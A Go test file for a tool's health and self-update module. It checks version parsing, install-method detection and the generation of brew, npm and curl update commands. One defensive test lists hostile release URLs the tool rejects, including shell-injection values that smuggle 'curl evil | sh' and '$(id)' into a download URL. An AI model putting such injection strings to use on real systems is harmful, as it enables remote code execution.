package health

import (
	"encoding/json"
	"strings"
	"testing"
)

func TestParse(t *testing.T) {
	out := `os=macOS 26.6.2
claude=2.1.285 (Claude Code)
claude_path=/opt/homebrew/bin/claude
herdr=herdr 0.9.3
herdr_path=/opt/homebrew/bin/herdr
herdr_server=0.9.1
arch=arm64
codex=codex-cli 0.153.0
codex_path=/opt/homebrew/lib/node_modules/@openai/codex/bin/codex.js
remuda=remuda v0.4.0-8-g3262e05
df=/dev/disk3s5   482797652 188483048 271706504    41% 1511806 2717065040    0%   /System/Volumes/Data
uptime=23:21  up 33 mins, 2 users, load averages: 6.52 3.32 3.43
`
	r, peer := Parse(out)
	if r.OS != "macOS 26.6.2" || r.Claude != "2.1.285" || r.ClaudeVia != "brew" || r.Herdr != "0.9.3" || r.Remuda != "v0.4.0-8-g3262e05" {
		t.Fatalf("versions: %+v", r)
	}
	if r.HerdrVia != "brew" || r.Arch != "arm64" || r.Codex != "0.153.0" || r.CodexVia != "npm" || r.HerdrServer != "0.9.1" {
		t.Fatalf("via/arch: %+v", r)
	}
	if r.DiskUsedPct != 41 || r.DiskFreeGB < 259 || r.DiskFreeGB > 260 {
		t.Fatalf("disk: %+v", r)
	}
	if r.Load1 != 6.52 || r.Uptime != "33 mins" {
		t.Fatalf("load/uptime: %+v", r)
	}
	// Linux: "up 5 days, 3:02, 1 user, load average: 0.52, 0.58, 0.59"
	l, _ := Parse("os=Linux 6.8.0\nuptime= 10:11:12 up 5 days,  3:02,  1 user,  load average: 0.52, 0.58, 0.59\ndf=/dev/sda1 100000000 50000000 50000000 50% /\n")
	if l.Load1 != 0.52 || l.Uptime != "5 days,  3:02" || l.DiskUsedPct != 50 {
		t.Fatalf("linux: %+v", l)
	}
	if e, _ := Parse(""); e.Claude != "" {
		t.Fatal("empty")
	}
	if peer != nil || r.Running {
		t.Fatal("no peer lines, no peer")
	}
	// a running remuda with its token is a peer; a token alone is not
	p, peer2 := Parse("peer={\"herdr\":true,\"ok\":true,\"version\":\"v0.4.0-9-gabc\"}\npeer_token=abc123\n")
	if !p.Running || peer2 == nil || peer2.Token != "abc123" || peer2.Version != "v0.4.0-9-gabc" || peer2.Port != 7317 {
		t.Fatalf("peer: %+v %+v", p, peer2)
	}
	if _, none := Parse("peer_token=abc123\n"); none != nil {
		t.Fatal("a token without an answer is no peer")
	}
}

func TestNewer(t *testing.T) {
	cases := []struct {
		a, b string
		want bool
	}{
		{"2.1.285", "2.1.295", true},
		{"2.1.295", "2.1.285", false},
		{"0.9.3", "v0.9.3", false},
		{"0.9.1", "v0.9.3", true},
		{"", "1.0.0", false},
		{"1.9.0", "2.0.0", true},
	}
	for _, c := range cases {
		if got := Newer(c.a, c.b); got != c.want {
			t.Errorf("Newer(%q, %q) = %v", c.a, c.b, got)
		}
	}
}

func TestInstalledVia(t *testing.T) {
	if installedVia("../Cellar/claude-code/2.1.285/bin/claude") != "brew" || installedVia("/opt/homebrew/bin/claude") != "brew" || installedVia("../lib/node_modules/@anthropic-ai/claude-code/cli.js") != "npm" || installedVia("/Users/x/.local/bin/claude") != "native" || installedVia("/Users/x/.nvm/versions/node/v22/bin/claude") != "npm" || installedVia("/usr/bin/claude") != "" {
		t.Fatal("via")
	}
}

func TestPlan(t *testing.T) {
	r := &Report{Claude: "2.1.285", ClaudeVia: "brew", Codex: "0.160.0", CodexVia: "npm", Herdr: "0.9.1", HerdrVia: "installer"}
	if u, err := Plan("claude", r); err != nil || !strings.Contains(u.Command, "brew update && brew upgrade claude-code") {
		t.Fatalf("claude: %+v %v", u, err)
	}
	if u, err := Plan("codex", r); err != nil || !strings.Contains(u.Command, "@openai/codex@latest") {
		t.Fatalf("codex: %+v %v", u, err)
	}
	if u, err := Plan("herdr", r); err != nil || !strings.Contains(u.Command, "herdr update --handoff") {
		t.Fatalf("herdr: %+v %v", u, err)
	}
	if _, err := Plan("gemini", r); err == nil {
		t.Fatal("gemini is not installed")
	}
	if u, err := Plan("agents", r); err != nil || !strings.Contains(u.Command, "Update Claude Code") || strings.Contains(u.Command, "Gemini") {
		t.Fatalf("agents: %+v %v", u, err)
	}
	if u, _ := Plan("agents", r); strings.Count(u.Command, "brew update ||") != 1 || strings.Contains(u.Command, "brew update && brew upgrade") {
		t.Fatalf("agents: brew update once, up front: %s", u.Command)
	}
	if u, _ := Plan("herdr", &Report{Herdr: "0.9.3", HerdrVia: "brew"}); !strings.Contains(u.Command, "brew update && brew upgrade herdr && herdr --version\n#") {
		t.Fatalf("herdr brew: %s", u.Command)
	}
	if ups := Updates(&Report{Herdr: "0.9.3", HerdrVia: "installer", HerdrServer: "0.9.1"}, Latest{}); len(ups) != 1 || !strings.HasPrefix(ups[0].Note, "The server runs 0.9.1 while 0.9.3 is installed.") {
		t.Fatalf("server note: %+v", ups)
	}
	ups := Updates(r, Latest{Claude: "2.1.296", Herdr: "0.9.3"})
	if len(ups) != 3 || !strings.Contains(ups[0].Note, "0.9.1 → 0.9.3") || !strings.Contains(ups[1].Note, "→ 2.1.296") {
		t.Fatalf("updates: %+v", ups)
	}
}

// ---- remuda's own releases ----

func TestNewerReadsTheVersionOutOfADescribe(t *testing.T) {
	if !Newer("v0.4.0-24-g5dac31e", "v0.5.0") {
		t.Fatal("a release past the tag the build sits on is newer")
	}
	if Newer("v0.4.0-24-g5dac31e", "v0.4.0") {
		t.Fatal("the tag the build sits on is not newer than the build")
	}
	if Newer("dev", "v0.5.0") || Newer("v0.5.0", "") {
		t.Fatal("no version, no comparison")
	}
}

// strconvQuote is a JSON string literal.
func strconvQuote(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

const releaseJSON = `{"tag_name":"v0.5.0","name":"remuda 0.5.0","assets":[
 {"name":"remuda-darwin-arm64","browser_download_url":"https://github.com/dev1antdev/remuda/releases/download/v0.5.0/remuda-darwin-arm64"},
 {"name":"remuda-linux-amd64","browser_download_url":"https://github.com/dev1antdev/remuda/releases/download/v0.5.0/remuda-linux-amd64"},
 {"name":"checksums.txt","browser_download_url":"https://github.com/dev1antdev/remuda/releases/download/v0.5.0/checksums.txt"}]}`

func TestParseRelease(t *testing.T) {
	rel, err := parseRelease(strings.NewReader(releaseJSON))
	if err != nil {
		t.Fatal(err)
	}
	if rel.Tag != "v0.5.0" || rel.Version != "0.5.0" || len(rel.Assets) != 2 || !strings.HasSuffix(rel.Assets["remuda-darwin-arm64"], "/v0.5.0/remuda-darwin-arm64") || !strings.HasSuffix(rel.Checksums, "/checksums.txt") {
		t.Fatalf("release %+v", rel)
	}
	if _, err := parseRelease(strings.NewReader(`{"tag_name":"nightly","assets":[]}`)); err == nil {
		t.Fatal("a tag without a version was accepted")
	}
}

func TestAssetName(t *testing.T) {
	for _, c := range []struct{ os, arch, want string }{
		{"macOS 26.6.2", "arm64", "remuda-darwin-arm64"},
		{"darwin", "arm64", "remuda-darwin-arm64"},
		{"Linux 6.8.0-45-generic", "amd64", "remuda-linux-amd64"},
		{"linux", "arm64", "remuda-linux-arm64"},
		{"Windows", "amd64", ""},
		{"macOS 26.6.2", "", ""},
		{"", "arm64", ""},
	} {
		if got := AssetName(c.os, c.arch); got != c.want {
			t.Errorf("AssetName(%q, %q) = %q, want %q", c.os, c.arch, got, c.want)
		}
	}
}

func TestReleaseUpdate(t *testing.T) {
	rel, _ := parseRelease(strings.NewReader(releaseJSON))
	u, ok := ReleaseUpdate("v0.4.0-24-g5dac31e", "macOS 26.6.2", "arm64", rel, false)
	if !ok || u.What != "remuda-release" || u.Title != "Download & install remuda v0.5.0" {
		t.Fatalf("remote: %+v %v", u, ok)
	}
	for _, want := range []string{
		`curl -fsSL --retry 3 -o "$HOME/.local/bin/remuda.new" 'https://github.com/dev1antdev/remuda/releases/download/v0.5.0/remuda-darwin-arm64'`,
		`/v0.5.0/checksums.txt`,
		`awk -v n='remuda-darwin-arm64'`,
		`mv "$HOME/.local/bin/remuda.new" "$HOME/.local/bin/remuda"`,
		`launchctl kickstart -k`,
	} {
		if !strings.Contains(u.Command, want) {
			t.Errorf("remote command lacks %q:\n%s", want, u.Command)
		}
	}
	if strings.Contains(u.Command, "sleep 2") {
		t.Error("a remote restart is not delayed")
	}
	if !strings.Contains(u.Note, "v0.4.0-24-g5dac31e → v0.5.0") || !strings.Contains(u.Note, "checksums") || strings.Contains(u.Note, "serving this page") {
		t.Errorf("remote note: %s", u.Note)
	}
	// the machine serving the page restarts after the job, not during it
	l, ok := ReleaseUpdate("v0.4.0-24-g5dac31e", "darwin", "arm64", rel, true)
	if !ok || !strings.Contains(l.Command, "sleep 2") || !strings.Contains(l.Command, "launchctl print") || !strings.Contains(l.Note, "serving this page") {
		t.Fatalf("local: %+v", l)
	}
	// not newer, no binary for the platform, nothing installed: no offer
	if _, ok := ReleaseUpdate("v0.5.0", "darwin", "arm64", rel, false); ok {
		t.Error("the same version was offered")
	}
	if _, ok := ReleaseUpdate("v0.5.0-3-gabc1234", "darwin", "arm64", rel, false); ok {
		t.Error("a build past the release was offered the release")
	}
	if _, ok := ReleaseUpdate("v0.4.0", "macOS 26.6.2", "amd64", rel, false); ok {
		t.Error("a platform without an asset was offered")
	}
	if _, ok := ReleaseUpdate("", "darwin", "arm64", rel, false); ok {
		t.Error("a machine without remuda was offered a release")
	}
	if _, ok := ReleaseUpdate("v0.4.0", "darwin", "arm64", Release{}, false); ok {
		t.Error("no release known, yet offered")
	}
	// an asset URL that is not GitHub's for this release is no release: it goes into a shell
	for _, bad := range []string{
		`https://evil.example/remuda-darwin-arm64`,
		`https://github.com/someone/else/releases/download/v0.5.0/remuda-darwin-arm64`,
		`https://github.com/dev1antdev/remuda/releases/download/v0.4.0/remuda-darwin-arm64`,
		`https://github.com/dev1antdev/remuda/releases/download/v0.5.0/x"; curl evil | sh; echo "`,
		`https://github.com/dev1antdev/remuda/releases/download/v0.5.0/x'; curl evil | sh; echo '`,
		`http://github.com/dev1antdev/remuda/releases/download/v0.5.0/remuda-darwin-arm64`,
		`https://github.com/dev1antdev/remuda/releases/download/v0.5.0/remuda-darwin-arm64?x=$(id)`,
	} {
		hostile, _ := parseRelease(strings.NewReader(`{"tag_name":"v0.5.0","assets":[{"name":"remuda-darwin-arm64","browser_download_url":` + strconvQuote(bad) + `}]}`))
		if _, ok := ReleaseUpdate("v0.4.0", "darwin", "arm64", hostile, false); ok {
			t.Errorf("a release with asset URL %q was offered", bad)
		}
	}
	// a release without checksums installs, and says it is not verified
	old, _ := parseRelease(strings.NewReader(`{"tag_name":"v0.6.0","assets":[{"name":"remuda-darwin-arm64","browser_download_url":"https://github.com/dev1antdev/remuda/releases/download/v0.6.0/remuda-darwin-arm64"}]}`))
	n, ok := ReleaseUpdate("v0.4.0", "darwin", "arm64", old, false)
	if !ok || !strings.Contains(n.Command, "not verified") || strings.Contains(n.Command, "awk") || !strings.Contains(n.Note, "no checksums.txt") {
		t.Fatalf("no checksums: %+v", n)
	}
}
